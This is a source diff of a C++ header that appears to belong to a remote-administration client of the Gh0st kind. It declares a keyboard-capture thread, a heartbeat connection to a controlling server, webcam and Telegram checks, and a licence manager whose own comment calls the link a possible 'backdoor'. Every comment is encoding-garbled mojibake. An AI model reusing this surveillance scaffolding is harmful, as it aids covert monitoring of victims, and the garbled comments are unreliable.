@@ -1,4 +1,4 @@
-// KernelManager.h: interface for the CKernelManager class.
+ï»¿// KernelManager.h: interface for the CKernelManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -20,7 +20,7 @@
 #include <TlHelp32.h>
 #include "LoginServer.h"
 
-// ¸ù¾İÅäÖÃ¾ö¶¨²ÉÓÃÊ²Ã´Í¨Ñ¶Ğ­Òé
+// æ ¹æ®é…ç½®å†³å®šé‡‡ç”¨ä»€ä¹ˆé€šè®¯åè®®
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect = false);
 
 ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP);
@@ -81,7 +81,7 @@ private:
     bool IsWorkstationLocked()
     {
         HDESK hInput = OpenInputDesktop(0, FALSE, GENERIC_READ);
-        // Èç¹ûÎŞ·¨´ò¿ª×ÀÃæ£¬¿ÉÄÜÊÇÒòÎª×ÀÃæÒÑ¾­ÇĞ»»µ½ Winlogon
+        // å¦‚æœæ— æ³•æ‰“å¼€æ¡Œé¢ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ¡Œé¢å·²ç»åˆ‡æ¢åˆ° Winlogon
         if (!hInput) return true;
         char name[256] = {0};
         DWORD needed;
@@ -95,9 +95,9 @@ private:
 };
 
 struct RttEstimator {
-    double srtt = 0.0;       // Æ½»¬ RTT (Ãë)
-    double rttvar = 0.0;     // RTT ²¨¶¯ (Ãë)
-    double rto = 0.0;        // ³¬Ê±Ê±¼ä (Ãë)
+    double srtt = 0.0;       // å¹³æ»‘ RTT (ç§’)
+    double rttvar = 0.0;     // RTT æ³¢åŠ¨ (ç§’)
+    double rto = 0.0;        // è¶…æ—¶æ—¶é—´ (ç§’)
     bool initialized = false;
 
     void update_from_sample(double rtt_ms)
@@ -105,7 +105,7 @@ struct RttEstimator {
         const double alpha = 1.0 / 8;
         const double beta = 1.0 / 4;
 
-        // ×ª»»³ÉÃë
+        // è½¬æ¢æˆç§’
         double rtt = rtt_ms / 1000.0;
 
         if (!initialized) {
@@ -119,7 +119,7 @@ struct RttEstimator {
             rto = srtt + 4.0 * rttvar;
         }
 
-        // ÏŞÖÆ×îĞ¡ RTO£¨RFC 6298 ÍÆ¼ö 1 Ãë£©
+        // é™åˆ¶æœ€å° RTOï¼ˆRFC 6298 æ¨è 1 ç§’ï¼‰
         if (rto < 1.0) rto = 1.0;
     }
 };
@@ -135,20 +135,20 @@ public:
 	virtual VOID OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength);
     ThreadInfo* m_hKeyboard;
     ThreadInfo  m_hThread[MAX_THREADNUM];
-    // ´ËÖµÔÚÔ­´úÂëÖĞÊÇÓÃÓÚ¼ÇÂ¼Ïß³ÌÊıÁ¿£»µ±Ïß³ÌÊıÁ¿³¬³öÏŞÖÆÊ±m_hThread»áÔ½½ç¶øµ¼ÖÂ³ÌĞòÒì³£
-    // Òò´ËÎÒ½«´ËÖµµÄº¬ÒåĞŞ¸ÄÎª"¿ÉÓÃÏß³ÌÏÂ±ê"£¬´ú±íÊı×ém_hThreadÖĞËùÖ¸Î»ÖÃ¿ÉÓÃ£¬¼´´´½¨ĞÂµÄÏß³Ì·ÅÖÃÔÚ¸ÃÎ»ÖÃ
+    // æ­¤å€¼åœ¨åŸä»£ç ä¸­æ˜¯ç”¨äºè®°å½•çº¿ç¨‹æ•°é‡ï¼›å½“çº¿ç¨‹æ•°é‡è¶…å‡ºé™åˆ¶æ—¶m_hThreadä¼šè¶Šç•Œè€Œå¯¼è‡´ç¨‹åºå¼‚å¸¸
+    // å› æ­¤æˆ‘å°†æ­¤å€¼çš„å«ä¹‰ä¿®æ”¹ä¸º"å¯ç”¨çº¿ç¨‹ä¸‹æ ‡"ï¼Œä»£è¡¨æ•°ç»„m_hThreadä¸­æ‰€æŒ‡ä½ç½®å¯ç”¨ï¼Œå³åˆ›å»ºæ–°çš„çº¿ç¨‹æ”¾ç½®åœ¨è¯¥ä½ç½®
     ULONG   m_ulThreadCount;
     UINT	GetAvailableIndex();
     State& g_bExit; // Hide base class variable
     static int g_IsAppExit;
     MasterSettings m_settings;
-    RttEstimator m_nNetPing; // ÍøÂç×´¿ö
-    // ·¢ËÍĞÄÌø
+    RttEstimator m_nNetPing; // ç½‘ç»œçŠ¶å†µ
+    // å‘é€å¿ƒè·³
     virtual int SendHeartbeat()
     {
         for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
             Sleep(1000);
-        if (m_settings.ReportInterval <= 0) { // ¹Ø±ÕÉÏ±¨ĞÅÏ¢£¨º¬ĞÄÌø£©
+        if (m_settings.ReportInterval <= 0) { // å…³é—­ä¸ŠæŠ¥ä¿¡æ¯ï¼ˆå«å¿ƒè·³ï¼‰
             for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected()&& m_settings.ReportInterval <= 0; --i)
                 Sleep(1000);
             return 0;
@@ -171,28 +171,28 @@ public:
     bool SoftwareCheck(int type)
     {
         static std::map<int, std::string> m = {
-            {SOFTWARE_CAMERA, "ÉãÏñÍ·"},
+            {SOFTWARE_CAMERA, "æ‘„åƒå¤´"},
             {SOFTWARE_TELEGRAM, "telegram.exe" },
         };
         static bool hasCamera = WebCamIsExist();
         return type == SOFTWARE_CAMERA ? hasCamera : IsProcessRunning({ m[type] });
     }
-    // ¼ì²é½ø³ÌÊÇ·ñÕıÔÚÔËĞĞ
+    // æ£€æŸ¥è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¿è¡Œ
     bool IsProcessRunning(const std::vector<std::string>& processNames)
     {
         PROCESSENTRY32 pe32;
         pe32.dwSize = sizeof(PROCESSENTRY32);
 
-        // »ñÈ¡µ±Ç°ÏµÍ³ÖĞËùÓĞ½ø³ÌµÄ¿ìÕÕ
+        // è·å–å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹çš„å¿«ç…§
         HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hProcessSnap == INVALID_HANDLE_VALUE)
             return true;
 
-        // ±éÀúËùÓĞ½ø³Ì
+        // éå†æ‰€æœ‰è¿›ç¨‹
         if (Process32First(hProcessSnap, &pe32)) {
             do {
                 for (const auto& processName : processNames) {
-                    // Èç¹û½ø³ÌÃû³ÆÆ¥Åä£¬Ôò·µ»Ø true
+                    // å¦‚æœè¿›ç¨‹åç§°åŒ¹é…ï¼Œåˆ™è¿”å› true
                     if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                         SAFE_CLOSE_HANDLE(hProcessSnap);
                         return true;
@@ -211,10 +211,10 @@ public:
 };
 
 // [IMPORTANT]
-// ÊÚÈ¨¹ÜÀíÆ÷: ÓÃÓÚ´¦ÀíÊÚÈ¨Ïà¹ØµÄĞÄÌøºÍÏìÓ¦£¬Ò»µ©ÊÚÈ¨³É¹¦Ôò´ËÏß³Ì½«Ö÷¶¯ÍË³ö£¬²»ÔÙºÍÖ÷¿Ø½øĞĞÊı¾İ½»»¥.
-// Èç¹ûÊÚÈ¨²»³É¹¦Ôò¼ÌĞø±£³ÖºÍÖ÷¿ØµÄÁ¬½Ó£¬°üÀ¨½øĞĞ±ØÒªµÄÊı¾İ½»»¥£¬Õâ¿ÉÄÜ±»¶¨ÒåÎª¡°ºóÃÅ¡±£¬µ«ÕâÊÇ±ØĞëµÄ.
-// ×¢Òâ: ÊÚÈ¨¹ÜÀíÆ÷ºÍÆÕÍ¨µÄÄÚºË¹ÜÀíÆ÷ÔÚĞÄÌø°üµÄ´¦ÀíÉÏÓĞËù²»Í¬£¬ÊÚÈ¨¹ÜÀíÆ÷»áÔÚĞÄÌø°üÖĞ¸½¼ÓÊÚÈ¨Ïà¹ØµÄĞÅÏ¢.
-// ÈÎºÎÊÔÍ¼Í¨¹ıĞŞ¸Ä´ËÀàÈ¡ÏûÊÚÈ¨¼ì²éµÄĞĞÎª¶¼ÊÇ²»±»ÔÊĞíµÄ£¬²¢ÇÒ²»»á³É¹¦£¬ÉõÖÁ¿ÉÄÜÒıÆğ³ÌĞòÇ¿ÖÆÍË³ö.
+// æˆæƒç®¡ç†å™¨: ç”¨äºå¤„ç†æˆæƒç›¸å…³çš„å¿ƒè·³å’Œå“åº”ï¼Œä¸€æ—¦æˆæƒæˆåŠŸåˆ™æ­¤çº¿ç¨‹å°†ä¸»åŠ¨é€€å‡ºï¼Œä¸å†å’Œä¸»æ§è¿›è¡Œæ•°æ®äº¤äº’.
+// å¦‚æœæˆæƒä¸æˆåŠŸåˆ™ç»§ç»­ä¿æŒå’Œä¸»æ§çš„è¿æ¥ï¼ŒåŒ…æ‹¬è¿›è¡Œå¿…è¦çš„æ•°æ®äº¤äº’ï¼Œè¿™å¯èƒ½è¢«å®šä¹‰ä¸ºâ€œåé—¨â€ï¼Œä½†è¿™æ˜¯å¿…é¡»çš„.
+// æ³¨æ„: æˆæƒç®¡ç†å™¨å’Œæ™®é€šçš„å†…æ ¸ç®¡ç†å™¨åœ¨å¿ƒè·³åŒ…çš„å¤„ç†ä¸Šæœ‰æ‰€ä¸åŒï¼Œæˆæƒç®¡ç†å™¨ä¼šåœ¨å¿ƒè·³åŒ…ä¸­é™„åŠ æˆæƒç›¸å…³çš„ä¿¡æ¯.
+// ä»»ä½•è¯•å›¾é€šè¿‡ä¿®æ”¹æ­¤ç±»å–æ¶ˆæˆæƒæ£€æŸ¥çš„è¡Œä¸ºéƒ½æ˜¯ä¸è¢«å…è®¸çš„ï¼Œå¹¶ä¸”ä¸ä¼šæˆåŠŸï¼Œç”šè‡³å¯èƒ½å¼•èµ·ç¨‹åºå¼ºåˆ¶é€€å‡º.
 class AuthKernelManager : public CKernelManager
 {
 public:
